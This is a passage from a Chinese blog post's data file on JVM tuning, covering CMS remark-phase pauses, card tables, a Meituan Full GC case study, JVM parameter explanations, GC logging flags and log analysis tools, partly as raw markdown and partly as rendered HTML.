分析GC日志可以得出同样的规律，Remark耗时>500ms时，新生代使用率都在75%以上。这样降低Remark阶段耗时问题转换成如何减少新生代对象数量。\n\n新生代中对象的特点是“朝生夕灭”，这样如果Remark前执行一次Minor GC，大部分对象就会被回收。\n\nCMS就采用了这样的方式，在Remark前增加了一个可中断的并发预清理（CMS-concurrent-abortable-preclean），该阶段主要工作仍然是并发标记对象是否存活，只是这个过程可被中断。\n\n此阶段在Eden区使用超过2M时启动，当然2M是默认的阈值，可以通过参数修改。如果此阶段执行时等到了Minor GC，那么上述灰色对象将被回收，Reamark阶段需要扫描的对象就少了。\n\n除此之外CMS为了避免这个阶段没有等到Minor GC而陷入无限等待，提供了参数CMSMaxAbortablePrecleanTime ，默认为5s，含义是如果可中断的预清理执行超过5s，不管发没发生Minor GC，都会中止此阶段，进入Remark。\n\n根据GC日志红色标记2处显示，可中断的并发预清理执行了5.35s，超过了设置的5s被中断，期间没有等到Minor GC ，所以Remark时新生代中仍然有很多对象。\n\n对于这种情况，CMS提供CMSScavengeBeforeRemark参数，用来保证Remark前强制进行一次Minor GC。\n\n#### 优化结果\n\n经过增加CMSScavengeBeforeRemark参数，单次执行时间>200ms的GC停顿消失，从监控上观察，GCtime和业务波动保持一致，不再有明显的毛刺。\n![](./2024/06/16/JVM如何调优/21.png)\n#### 小结\n\n通过案例分析了解到，由于跨代引用的存在，CMS在Remark阶段必须扫描整个堆，同时为了避免扫描时新生代有很多对象，增加了可中断的预清理阶段用来等待Minor GC的发生。只是该阶段有时间限制，如果超时等不到Minor GC，Remark时新生代仍然有很多对象，我们的调优策略是，通过参数强制Remark前进行一次Minor GC，从而降低Remark阶段的时间。\n\n#### 更多思考\n\n案例中只涉及老年代GC，其实新生代GC存在同样的问题，即老年代可能持有新生代对象引用，所以Minor GC时也必须扫描老年代。\n\n**JVM是如何避免Minor GC时扫描全堆的？** 经过统计信息显示，老年代持有新生代对象引用的情况不足1%，根据这一特性JVM引入了卡表（card table）来实现这一目的。如下图所示：\n\n![](./2024/06/16/JVM如何调优/22.png)\n**卡表**的具体策略是将老年代的空间分成大小为512B的若干张卡（card）。卡表本身是单字节数组，数组中的每个元素对应着一张卡，当发生老年代引用新生代时，虚拟机将该卡对应的卡表元素设置为适当的值。如上图所示，卡表3被标记为脏（卡表还有另外的作用，标识并发标记阶段哪些块被修改过），之后Minor GC时通过扫描卡表就可以很快的识别哪些卡中存在老年代指向新生代的引用。这样虚拟机通过空间换时间的方式，避免了全堆扫描。\n\n总结来说，CMS的设计聚焦在获取最短的时延，为此它“不遗余力”地做了很多工作，包括尽量让应用程序和GC线程并发、增加可中断的并发预清理阶段、引入卡表等，虽然这些操作牺牲了一定吞吐量但获得了更短的回收停顿时间。\n\n### 美团案例7：发生Stop-The-World的GC\n\n这个案例，来自美团技术官网\n\n#### 确定目标\n\nGC日志如下图（在GC日志中，Full GC是用来说明这次垃圾回收的停顿类型，代表STW类型的GC，并不特指老年代GC），根据GC日志可知本次Full GC耗时1.23s。这个在线服务同样要求低时延高可用。\n\n本次优化目标是降低单次STW回收停顿时间，提高可用性。\n\n![](./2024/06/16/JVM如何调优/23.png)\n#### 优化\n\n首先，什么时候可能会触发STW的Full GC呢？\n\n1.  Perm空间不足；\n\n2.  CMS GC时出现promotion failed和concurrent mode failure（concurrent mode failure发生的原因一般是CMS正在进行，但是由于老年代空间不足，需要尽快回收老年代里面的不再被使用的对象，这时停止所有的线程，同时终止CMS，直接进行Serial Old GC）；\n\n3.  统计得到的Young GC晋升到老年代的平均大小大于老年代的剩余空间；\n\n4.  主动触发Full GC（执行jmap -histo:live \\[pid\\]）来避免碎片问题。\n\n\n然后，我们来逐一分析一下：\n\n*   排除原因2：如果是原因2中两种情况，日志中会有特殊标识，目前没有。\n\n*   排除原因3：根据GC日志，当时老年代使用量仅为20%，也不存在大于2G的大对象产生。\n\n*   排除原因4：因为当时没有相关命令执行。\n\n*   锁定原因1：根据日志发现Full GC后，Perm区变大了，推断是由于永久代空间不足容量扩展导致的。\n\n\n找到原因后解决方法有两种：\n\n1.  通过把-XX:PermSize参数和-XX:MaxPermSize设置成一样，强制虚拟机在启动的时候就把永久代的容量固定下来，避免运行时自动扩容。\n\n2.  CMS默认情况下不会回收Perm区，通过参数CMSPermGenSweepingEnabled、CMSClassUnloadingEnabled ，可以让CMS在Perm区容量不足时对其回收。\n\n\n由于该服务没有生成大量动态类，回收Perm区收益不大，所以我们采用方案1，启动时将Perm区大小固定，避免进行动态扩容。\n\n#### 优化结果\n\n调整参数后，服务不再有Perm区扩容导致的STW GC发生。\n\n#### 小结\n\n对于性能要求很高的服务，建议将MaxPermSize和MinPermSize设置成一致（JDK8开始，Perm区完全消失，转而使用元空间。而元空间是直接存在内存中，不在JVM中），Xms和Xmx也设置为相同，这样可以减少内存自动扩容和收缩带来的性能损失。虚拟机启动的时候就会把参数中所设定的内存全部化为私有，即使扩容前有一部分内存不会被用户代码用到，这部分内存在虚拟机中被标识为虚拟内存，也不会交给其他进程使用。\n\n八：JVM调优常见面试题的精简答案\n-----------------\n\n#### 8\\. 1、调优包括哪些维度？\n\n架构调优、代码调优、JVM调优、数据库调优、操作系统调优等\n\n架构调优和代码调优是JVM调优的基础，其中**架构调优是对系统影响最大的**\n\n#### 8.2、何时进行JVM调优\n\n*   Heap内存（老年代）持续上涨达到设置的最大内存值；\n\n*   Full GC 次数频繁；\n\n*   GC 停顿时间过长（超过1秒）；\n\n*   应用出现OutOfMemory等内存异常；\n\n*   应用中有使用本地缓存且占用大量内存空间；\n\n*   系统吞吐量与响应性能不高或不降；\n\n\n#### 8.3、JVM调优的基本原则\n\n*   大多数的Java应用不需要进行JVM优化；\n\n*   大多数导致GC问题的原因是代码层面的问题导致的（代码层面）；\n\n*   上线之前，应先考虑将机器的JVM参数设置到最优；\n\n*   减少创建对象的数量（代码层面）；\n\n*   减少使用全局变量和大对象（代码层面）；\n\n*   优先架构调优和代码调优，JVM优化是不得已的手段（代码、架构层面）；\n\n*   分析GC情况优化代码比优化JVM参数更好（代码层面）\n\n\n**其实最有效的优化手段是架构和代码层面的优化，而JVM优化则是最后不得已的手段，也可以说是对服务器配置的最后一次“压榨”**\n\n#### 8.4、JVM调优目标\n\n目的都是为了令应用程序使用最小的硬件消耗来承载更大的吞吐。JVM调优主要是针对垃圾收集器的收集性能优化，令运行在虚拟机上的应用能够使用更少的内存以及延迟获取更大的吞吐量，总结以下：\n\n*   延迟：GC低停顿和GC低频率；\n\n*   低内存占用；\n\n*   高吞吐量。\n\n\n#### 8.5、JVM调优量化目标\n\n*   Heap 内存使用率 <= 70%;\n\n*   Old generation 内存使用率 <= 70%;\n\n*   avgpause <= 1秒;\n\n*   Full GC 次数 0 或 avg pause interval >= 24小时。\n\n\n#### 8.6、JVM调优的步骤\n\n*   分析GC日志及dump文件，判断是否需要优化，确定瓶颈问题点；\n\n*   确定JVM调优量化目标；\n\n*   确定JVM调优参数（根据历史JVM参数来调整）；\n\n*   依次调优内存、延迟、吞吐量等指标；\n\n*   对比观察调优前后的差异；\n\n*   不断的分析和调整，直到找到合适的JVM参数配置；\n\n*   找到最合适的参数，将这些参数应用到所有服务器，并进行后续跟踪。\n\n\n#### 8.7、VM参数解析及调优\n\n```\n\n\n\\-Xmx4g   \n–Xms4g   \n–Xmn1200m   \n–Xss512k   \n\\-XX:NewRatio=4   \n\\-XX:SurvivorRatio=8   \n\\-XX:PermSize=100m   \n\\-XX:MaxPermSize=256m   \n\\-XX:MaxTenuringThreshold=15  \n\n\n\n```\n\n*   \\-Xmx4g：堆内存最大值为4GB。\n\n*   \\-Xms4g：初始化堆内存大小为4GB。\n\n*   \\-Xmn1200m：**设置年轻代大小为1200MB**。增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3/8。\n\n*   \\-Xss512k：**设置每个线程的堆栈大小**。JDK5.0以后每个线程堆栈大小为1MB，以前每个线程堆栈大小为256K。应根据应用线程所需内存大小进行调整。在相同物理内存下，减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在3000~5000左右。\n\n*   \\-XX:NewRatio=4：**设置年轻代（包括Eden和两个Survivor区）与年老代的比值（除去持久代）**。设置为4，则年轻代与年老代所占比值为1：4，年轻代占整个堆栈的1/5\n\n*   \\-XX:SurvivorRatio=8：**设置年轻代中Eden区与Survivor区的大小比值**。设置为8，则两个Survivor区与一个Eden区的比值为2:8，一个Survivor区占整个年轻代的1/10\n\n*   \\-XX:PermSize=100m：初始化永久代大小为100MB。\n\n*   \\-XX:MaxPermSize=256m：设置持久代大小为256MB。\n\n*   \\-XX:MaxTenuringThreshold=15：**设置垃圾最大年龄**。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。\n\n\n**可调优参数：**\n\n*   \\-Xms：初始化堆内存大小，默认为物理内存的1/64(小于1GB)。\n\n*   \\-Xmx：**堆内存最大值**。默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制。\n\n*   \\-Xmn：新生代大小，包括Eden区与2个Survivor区。\n\n*   \\-XX:SurvivorRatio=1：Eden区与一个Survivor区比值为1:1。\n\n*   \\-XX:MaxDirectMemorySize=1G：**直接内存**。报java.lang.OutOfMemoryError: Direct buffer memory异常可以上调这个值。\n\n*   \\-XX:+DisableExplicitGC：禁止运行期显式地调用System.gc()来触发fulll GC。\n\n*   注意: Java RMI的定时GC触发机制可通过配置-Dsun.rmi.dgc.server.gcInterval=86400来控制触发的时间。\n\n*   \\-XX:CMSInitiatingOccupancyFraction=60：老年代内存回收阈值，默认值为68。\n\n*   \\-XX:ConcGCThreads=4：CMS垃圾回收器并行线程线，推荐值为CPU核心数。\n\n*   \\-XX:ParallelGCThreads=8：新生代并行收集器的线程数。\n\n*   \\-XX:MaxTenuringThreshold=10：**设置垃圾最大年龄**。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。\n\n*   \\-XX:CMSFullGCsBeforeCompaction=4：指定进行多少次fullGC之后，进行tenured区 内存空间压缩。\n\n*   \\-XX:CMSMaxAbortablePrecleanTime=500：当abortable-preclean预清理阶段执行达到这个时间时就会结束。\n\n\n#### 8.8、内存调优示例\n\n```\n\n\n\\-XX:+PrintGC 　　输出GC日志  \n\\-XX:+PrintGCDetails 输出GC的详细日志  \n\\-XX:+PrintGCTimeStamps 输出GC的时间戳（以基准时间的形式）  \n\\-XX:+PrintGCDateStamps 输出GC的时间戳（以日期的形式，如 2013-05-04T21:53:59.234+0800）  \n\\-XX:+PrintHeapAtGC 　　在进行GC的前后打印出堆的信息  \n\\-Xloggc:../logs/gc.log 日志文件的输出路径  \n\n\n\n```\n\n#### \n![](./2024/06/16/JVM如何调优/24.png)\n*   java heap：参数-Xms和-Xmx，建议扩大至3-4倍FullGC后的老年代空间占用。\n\n*   永久代：-XX:PermSize和-XX:MaxPermSize，建议扩大至1.2-1.5倍FullGc后的永久代空间占用。\n\n*   新生代：-Xmn，建议扩大至1-1.5倍FullGC之后的老年代空间占用。\n\n*   老年代：2-3倍FullGC后的老年代空间占用。\n\n    ```\n    \n    \n    \\-Xms373m -Xmx373m //4\\*93=372  \n    \\-Xmn140m //1.5\\*93=139.5  \n    \\-XX:PermSize=5m -XX:MaxPermSize=5m //1.5\\*3=4.5  \n    \n    \n    \n    ```\n\n\n九 、结语\n-----\n\n在JVM调优中，关键在于准确识别系统的性能瓶颈和优化方向，选择适合的调优策略和参数。\n\n实施调优方案后，必须验证效果，并持续监控系统性能，及时调整优化策略和参数以保持系统高性能和稳定性。\n\n同时，需要及时发现和解决各种潜在的性能问题，如内存泄漏、CPU飙升、频繁的垃圾回收等，以确保系统在高负载和复杂环境下能够保持卓越的性能表现。\n\n总之，JVM调优是一个持续改进的过程，通过对系统性能的深入分析和优化，确保Java应用程序在各种情况下都能够保持高效稳定的运行状态。\n\n随着硬件技术的迅速发展，JVM调优也将面临新的挑战和机遇。新一代的处理器、存储技术以及分布式系统架构等将对JVM调优提出更高的要求，需要更智能、更高效的优化方案来适应日益复杂的应用场景和巨大的数据处理需求。\n\n未来，JVM调优将持续创新和进步，以满足不断变化的业务需求和技术挑战，为Java应用程序提供更稳定、更高效的运行环境，推动Java生态系统的蓬勃发展和壮大。\n\n与开篇所述保持一致，我们强调在JVM调优中，真正的参数调整是较少的，更多的是通过分析日志和结合系统业务进行代码层面的优化。\n\n这可能是调优工作中占据更大比重的内容。我们不应迷失方向，只为了调优而调优，只为了调整参数而调整参数。最终，我们需要回归到业务本质，这才是最核心的内容。我们也需要更深入地了解JVM的相关参数，以更好地支撑业务需求的实现。\n\n说在最后：有问题找老架构取经\n--------------\n\n**JVM 调优方法论**、JVM调优 相关的面试题，是非常常见的面试题。也是核心面试题。\n\n以上的内容，如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。\n\n","slug":"JVM如何调优","published":1,"updated":"2024-06-16T10:41:34.562Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ry2000ibsuhctwyeb37","content":"<h2 id=\"一：引言\"><a href=\"#一：引言\" class=\"headerlink\" title=\"一：引言\"></a>一：引言</h2><p>在软件开发和运维中，JVM作为执行Java程序的核心引擎，扮演着至关重要的角色。</p>\n<p>随着应用程序的复杂性和负载不断增加，对JVM的性能和稳定性要求也越来越高。</p>\n<p>在此背景下，JVM调优变得至关重要。</p>\n<p>JVM调优涉及到一系列的参数设置、垃圾收集器的选择、内存分配策略等方面，对于提高Java应用程序的性能、减少内存泄漏、降低系统崩溃风险都有重要作用。</p>\n<p>另外，在大厂面试中，JVM调优的知识也是备受关注的考察点，因为它直接关系到系统的稳定性和性能优化。</p>\n<p>候选人对JVM调优的理解和实践能力，可以反映其在Java虚拟机运行机制方面的深度和广度，</p>\n<p>需要注意的是，调优并非首选方法，一般而言，解决性能问题的第一步是优化程序本身，只有在必要时才考虑进行JVM调优。</p>\n<h2 id=\"JVM调优，有什么好处？\"><a href=\"#JVM调优，有什么好处？\" class=\"headerlink\" title=\"JVM调优，有什么好处？\"></a>JVM调优，有什么好处？</h2><p>JVM调优目的是通过调整Java虚拟机的配置参数、垃圾回收策略和内存分配等手段，提升Java应用程序的性能、稳定性和可靠性。</p>\n<p>随着应用规模和用户量的增长，原始的JVM配置可能无法满足业务需求，因此必须进行调优以确保系统的正常运行。</p>\n<p>然而，并不是所有异常情况都需要进行JVM调优。</p>\n<p>在实际情况中，大多数问题可以通过分析JVM日志文件和业务逻辑来定位，并通过业务层面的优化来解决。</p>\n<p>尽管如此，深入了解各项参数和指标仍然至关重要，因为它们有助于更快速地理解和解决问题，调优能带来什么好处？</p>\n<ul>\n<li><p><strong>性能层面：</strong></p>\n<p>通过调整JVM参数和优化垃圾回收机制，能够提高Java应用程序的性能，减少延迟，提升系统响应速度和并发能力、和吞吐量。</p>\n</li>\n<li><p><strong>资源利用：</strong></p>\n<p>合理配置JVM资源，包括内存、CPU等，能够有效地利用硬件资源，提高系统的资源利用率，降低成本。</p>\n</li>\n<li><p><strong>稳定性：</strong> 通过调优JVM，可减少内存泄漏、OOM（Out of Memory）等问题的发生，提高系统的稳定性和可靠性，降低系统崩溃的风险。</p>\n</li>\n</ul>\n<h2 id=\"二：JVM调优的关注哪些指标？\"><a href=\"#二：JVM调优的关注哪些指标？\" class=\"headerlink\" title=\"二：JVM调优的关注哪些指标？\"></a>二：JVM调优的关注哪些指标？</h2><p>调优，到底调的是什么？</p>\n<p>调优之前，要搞清楚一个问题：怎样才算是“优”。</p>\n<p>如何定性？</p>\n<p>如何定量？</p>\n<p>到底需要其实是需要关注几个关键的指标，以全面评估系统的运行状态和性能表现。</p>\n<p>需要有一个具体的指标来衡量性能情况，而在JVM里面衡量性能的两个核心指标分别“吞吐量”和“停顿时间”。</p>\n<h3 id=\"核心指标1：吞吐量-throughput-：\"><a href=\"#核心指标1：吞吐量-throughput-：\" class=\"headerlink\" title=\"核心指标1：吞吐量(throughput)：\"></a>核心指标1：吞吐量(throughput)：</h3><p>程序运行过程中执行两种任务，分别是执行业务代码的 任务 和进行垃圾回收的任务，</p>\n<p>吞吐量大，意就是说程序运行业务代码的时间越多， 换句话说，执行业务任务越多， 吞吐量就越高，</p>\n<p>吞吐量计算公式 ，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">吞吐量 = CPU在用户应用程序运行的时间 / （CPU在用户应用程序运行的时间 + CPU垃圾回收的时间），  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在实践中我们发现对于大多数的应用领域，评估一个垃圾收集(GC)算法如何，有如下一个核心标准：</p>\n<ul>\n<li>吞吐量越高越好</li>\n</ul>\n<p>一般而言GC 的吞吐量不能低于 95%。</p>\n<p>本质上，吞吐量是指应用程序线程用时占程序总用时的比例。</p>\n<p>例如，吞吐量99&#x2F;100， 意味着100秒的程序执行时间，应用程序线程运行了99秒， 而在这一时间段内GC线程只运行了1秒。</p>\n<h3 id=\"核心指标2：停顿时间-pause-times-：\"><a href=\"#核心指标2：停顿时间-pause-times-：\" class=\"headerlink\" title=\"核心指标2：停顿时间(pause times)：\"></a>核心指标2：停顿时间(pause times)：</h3><p>JVM在专门的线程(GC threads)中执行GC。</p>\n<p>因为JVM进行垃圾回收的时候，某些阶段必须要停止业务线程专心进行垃圾收集， 只要GC线程是活动的，它们将与应用程序线程(application threads)争用当前可用CPU的时钟周期。</p>\n<p>停顿时间(pause times) 是指一个时间段内应用程序线程让与GC线程执行，而应用程序线程完全暂停。</p>\n<p>例如，GC期间100毫秒的停顿时间， 意味着在这100毫秒期间内没有应用程序线程是活动的。</p>\n<p>如果说一个正在运行的应用程序有100毫秒的“平均停顿时间”，那么就是说该应用程序所有的停顿时间平均长度为100毫秒。</p>\n<p>同样，100毫秒的“最大停顿时间”是指：该应用程序所有的停顿时间最大不超过100毫秒。</p>\n<p>注意，这里说的JVM停顿时间，就是指JVM停止业务线程而去进行垃圾收集的这段时长，其实指的是<strong>每次GC造成用户线程停顿的平均时间</strong>，不是总的垃圾回收时间。</p>\n<p>停顿时间越长，就意味着GC场景下，用户线程平均等待的时间越长，停顿时间会直接影响用户使用系统的体验。</p>\n<p>除了吞吐量(throughput) 、停顿时间(pause times) 两个核心指标，JVM调优还会关心下面的非核心指标：</p>\n<h3 id=\"核心指标3：堆内存占用量：\"><a href=\"#核心指标3：堆内存占用量：\" class=\"headerlink\" title=\"核心指标3：堆内存占用量：\"></a>核心指标3：堆内存占用量：</h3><p>细致监控堆内存使用量、非堆内存使用量以及永久代（或元空间）使用量指标数据。</p>\n<p>举例来说，当堆内存使用量持续增加，而内存回收频率较低时，可能暗示着潜在的内存泄漏问题，这可能导致系统性能下降或者最终的内存耗尽（OOM）。</p>\n<h3 id=\"非核指标1：垃圾回收次数\"><a href=\"#非核指标1：垃圾回收次数\" class=\"headerlink\" title=\"非核指标1：垃圾回收次数\"></a>非核指标1：垃圾回收次数</h3><p>GC非常占用CPU资源的，如果GC占用的资源越多，那么意味着其他事情所用的资源会减少，系统所能做的事情也会越少。</p>\n<p>尽管垃圾回收过程会消耗大量的CPU资源，但是我们也不能单纯地、一味的追求GC次数减少</p>\n<p>为啥? GC次数减少了，有可能单次GC的时间变长，那么就可能会增加单次GC的“停顿时长”（核心指标2），</p>\n<h3 id=\"非核指标2：垃圾回收频率\"><a href=\"#非核指标2：垃圾回收频率\" class=\"headerlink\" title=\"非核指标2：垃圾回收频率\"></a>非核指标2：垃圾回收频率</h3><p>通常情况下，与垃圾回收次数相比，较低的垃圾回收频率被认为是更好的选择。</p>\n<p>垃圾回收的频率,需要适中</p>\n<ul>\n<li><p>频率过小,每次垃圾回收的时间会过长</p>\n</li>\n<li><p>频率过大,停顿时间长,延迟高</p>\n</li>\n</ul>\n<p>所以：通常来说垃圾回收频率是越低越好。</p>\n<p>详细记录GC频率、GC停顿时间以及每次GC后的内存情况。</p>\n<p>或者说：减少 GC次数可能会导致单次垃圾回收的时间变长，进而增加单次垃圾回收的“停顿时长”。</p>\n<p>所以， 需要在这两者之间做一些平衡。</p>\n<h2 id=\"吞吐量、暂停时间、堆内存占用三者之间的关系\"><a href=\"#吞吐量、暂停时间、堆内存占用三者之间的关系\" class=\"headerlink\" title=\"吞吐量、暂停时间、堆内存占用三者之间的关系\"></a>吞吐量、暂停时间、堆内存占用三者之间的关系</h2><p>这三个指标不可能同时达到,因为他们是一个不可能的关系</p>\n<p><strong>内存变大,要回收的东西变多,暂停时间自然增加.</strong></p>\n<p><strong>吞吐量增加,必然要降低垃圾回收频率,频率降低,垃圾谁收停顿时间必然增大.</strong></p>\n<p>因此,目前gc的优化方向主要是<strong>吞吐量和暂停时间.</strong></p>\n<h3 id=\"“高吞吐量”和“低停顿时间”是一对相互竞争的目标\"><a href=\"#“高吞吐量”和“低停顿时间”是一对相互竞争的目标\" class=\"headerlink\" title=\"“高吞吐量”和“低停顿时间”是一对相互竞争的目标\"></a>“高吞吐量”和“低停顿时间”是一对相互竞争的目标</h3><p>高吞吐量最好因为这会让应用程序的最终用户感觉只有应用程序线程在做“生产性”工作。</p>\n<p>直觉上，吞吐量越高程序运行越快。</p>\n<p>低停顿时间最好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。</p>\n<p>这取决于应用程序的类型，有时候甚至短暂的200毫秒暂停都可能打断终端用户体验。</p>\n<p>因此，具有低的最大停顿时间是非常重要的，特别是对于一个交互式应用程序。</p>\n<p>不幸的是”高吞吐量”和”低停顿时间”是一对相互竞争的目标（矛盾）。</p>\n<p>GC需要一定的前提条件以便安全地运行。</p>\n<p>例如，必须保证应用程序线程在GC线程试图确定哪些对象仍然被引用和哪些没有被引用的时候不修改对象的状态。</p>\n<p>为此，应用程序在GC期间必须停止(或者仅在GC的特定阶段，这取决于所使用的算法)。 然而这会增加额外的线程调度开销：直接开销是上下文切换，间接开销是因为缓存的影响。</p>\n<p>加上JVM内部安全措施的开销，这意味着GC及随之而来的不可忽略的开销，将增加GC线程执行实际工作的时间。</p>\n<p>因此我们可以通过尽可能少运行GC，来最大化吞吐量，例如，只有在不可避免的时候进行GC，来节省所有与它相关的开销。</p>\n<p>然而，仅仅偶尔运行GC意味着每当GC运行时将有许多工作要做，因为在此期间积累在堆中的对象数量很高。 单个GC需要花更多时间来完成， 从而导致更高的平均和最大停顿时间。</p>\n<p>因此，考虑到低停顿时间，最好频繁地运行GC以便更快速地完成。这反过来又增加了开销并导致吞吐量下降，我们又回到了起点。</p>\n<p>综上所述，在设计（或使用）GC算法时，我们必须确定我们的目标：</p>\n<p>一个GC算法只可能针对两个目标之一（即只专注于最大吞吐量或最小停顿时间），或尝试找到一个二者的折衷。</p>\n<h3 id=\"吞吐量和暂停时间是矛盾的-如何抉择\"><a href=\"#吞吐量和暂停时间是矛盾的-如何抉择\" class=\"headerlink\" title=\"吞吐量和暂停时间是矛盾的,如何抉择?\"></a>吞吐量和暂停时间是矛盾的,如何抉择?</h3><p>高吞吐量较好因为这会让应用程序的最终用户感觉只有应用程序线程在做”生产性”工作。直觉上,吞吐量越高程序运行越快。</p>\n<p>低暂停时间(低延迟)较好因为从最终用户的角度来看不管是GC还是其他原因导致一个应用被挂起始终是不好的。这取决于应用程序的类型, 有时候甚至短暂的200毫秒暂停都可能打断终端用户体验 。因此,具有低的较大暂停时间是非常重要的,特别是对于一个 交互式应用程序 。</p>\n<p>不幸的是”高吞吐量”和”低暂停时间”是一对相互竞争的目标(矛盾)。</p>\n<ul>\n<li><p>因为如果选择以吞吐量优先,那么 必然需要降低内存回收的执行频率 ,但是这样会导致GC需要更长的暂停时间来执行内存回收。</p>\n</li>\n<li><p>相反的,如果选择以低延迟优先为原则,那么为了降低每次执行的内存回收时的暂停时间,也 只能频繁地执行内存回收 ,但这又引起了年轻代内存的缩减和导致程序吞吐量的下降。</p>\n</li>\n</ul>\n<p>在设计(或使用)GC算法时,我们必须确定我们的目标: 一个GC算法可能针对两个目标之一(即只专注于较大吞吐量或最小暂停时间),或尝试找到一个二者的折中。</p>\n<p>现在标准: 在最大吞吐量优先的情况下,降低停顿时间</p>\n<h3 id=\"不同的垃圾回收器有不同的抉择方向\"><a href=\"#不同的垃圾回收器有不同的抉择方向\" class=\"headerlink\" title=\"不同的垃圾回收器有不同的抉择方向:\"></a>不同的垃圾回收器有不同的抉择方向:</h3><ul>\n<li><p>Parallel以吞吐量优先</p>\n</li>\n<li><p>cms以停顿时间优先</p>\n</li>\n<li><p>而G1则取折中方案: 在保证用户可接受的停顿时间的前提下,尽可能提高吞吐量.</p>\n</li>\n</ul>\n<p>JVM调优没有万能的公式和标准，因为每个人所面对的场景是不一样。</p>\n<p>要想调整到最优的性能，其实首先要确认的是自己的需求目标是什么(以吞吐量优先&#x2F;停顿时间优先)，</p>\n<p>然后，根据这个目标去慢慢的调整各项指标，从而达到一个最佳的平衡点。</p>\n<h2 id=\"三：如果获得JVM内存指标\"><a href=\"#三：如果获得JVM内存指标\" class=\"headerlink\" title=\"三：如果获得JVM内存指标?\"></a>三：如果获得JVM内存指标?</h2><p>在项目启动的时候 增加下列参数来收集GC日志，然后通过第三方的日志分析工具（比如GCesay:<a href=\"https://gceasy.io/%EF%BC%89\">https://gceasy.io/）</a></p>\n<p>分析收集到的GC日志来得到吞吐量、停顿时间相关的统计数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">java    </span><br><span class=\"line\">-XX:+PrintGCDetails -XX:+PrintGCDateStamps   </span><br><span class=\"line\">-XX:+UseGCLogFileRotation   </span><br><span class=\"line\">-XX:+PrintHeapAtGC -XX:NumberOfGCLogFiles=5    </span><br><span class=\"line\">-XX:GCLogFileSize=20M      </span><br><span class=\"line\">-Xloggc:/opt/ard-user-gc-%t.log    </span><br><span class=\"line\">-jar abg-user-1.0-SNAPSHOT.jar </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-Xloggc:/opt/app/ard-user/ard-user-gc-%t.log   设置日志目录和日志名称  </span><br><span class=\"line\">-XX:+UseGCLogFileRotation           开启滚动生成日志  </span><br><span class=\"line\">-XX:NumberOfGCLogFiles=5            滚动GC日志文件数，默认0，不滚动  </span><br><span class=\"line\">-XX:GCLogFileSize=20M               GC文件滚动大小，需开启UseGCLogFileRotation  </span><br><span class=\"line\">-XX:+PrintGCDetails                 开启记录GC日志详细信息（包括GC类型、各个操作使用的时间）,并且在程序运行结束打印出JVM的内存占用情况  </span><br><span class=\"line\">-XX:+ PrintGCDateStamps             记录系统的GC时间             </span><br><span class=\"line\">-XX:+PrintGCCause                   产生GC的原因(默认开启)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"日志分析工具有哪些？\"><a href=\"#日志分析工具有哪些？\" class=\"headerlink\" title=\"日志分析工具有哪些？\"></a>日志分析工具有哪些？</h3><p>我们看到日志，尤其是CMS和G1的日志，直接看日志文档都是很不方便的，密密麻麻的文字，其实市面上已经有一些日志分析工具了。</p>\n<p>进行系统调优时，首先需要对系统的各项指标进行检测。为了有效地进行监测和设置相应的阈值，我们通常会借助监控工具，例如普罗米修斯等。在分析阶段，以下工具是常用的：</p>\n<ol>\n<li><p>VisualVM：</p>\n<p>这是一个功能强大、可扩展的开源工具，用于深入分析Java应用程序。它提供了丰富的功能，包括性能监控、内存使用情况、垃圾回收情况等，并支持线程分析、堆快照等功能。</p>\n</li>\n<li><p>Java Mission Control (JMC)：</p>\n<p>由Oracle提供的专业Java性能监控和故障诊断工具。JMC集成了多种强大功能，包括垃圾回收分析、内存泄漏检测、线程分析等。</p>\n</li>\n<li><p>jvisualvm：</p>\n<p>这是JDK自带的监控和调试工具，可用于监视本地和远程Java应用程序的性能、内存使用情况等。它提供了直观的图形界面和丰富的监控指标。</p>\n</li>\n<li><p>JConsole：</p>\n<p>JConsole是JDK自带的监控工具，提供了基本的图形界面，可用于监视Java应用程序的内存使用情况、线程信息、垃圾回收情况等。</p>\n</li>\n<li><p>GCViewer：</p>\n<p>这是专门用于分析Java应用程序垃圾回收日志的工具。</p>\n<p>GCViewer能将GC日志解析成易于理解的图表和统计信息，帮助用户分析和优化垃圾回收行为。</p>\n</li>\n</ol>\n<p>接下来，介绍使用 gceasy.io 进行 日志分析</p>\n<p>网址：<a href=\"https://gceasy.io/\">https://gceasy.io/</a></p>\n<p>注意：这款工具不需要我们下载软件，他是在线的。</p>\n<p>我们要做的就是两步：</p>\n<p>步骤一：导出GC日志到本地磁盘</p>\n<p>步骤二：将本地日志上传到gceasy.io上，进行分析</p>\n<h3 id=\"指标分析第一步：导出日志\"><a href=\"#指标分析第一步：导出日志\" class=\"headerlink\" title=\"指标分析第一步：导出日志\"></a>指标分析第一步：导出日志</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\-Xloggc:/Users/lxl/Downloads/gc.log  </span><br><span class=\"line\">\\-XX:+PrintGCDetails  </span><br><span 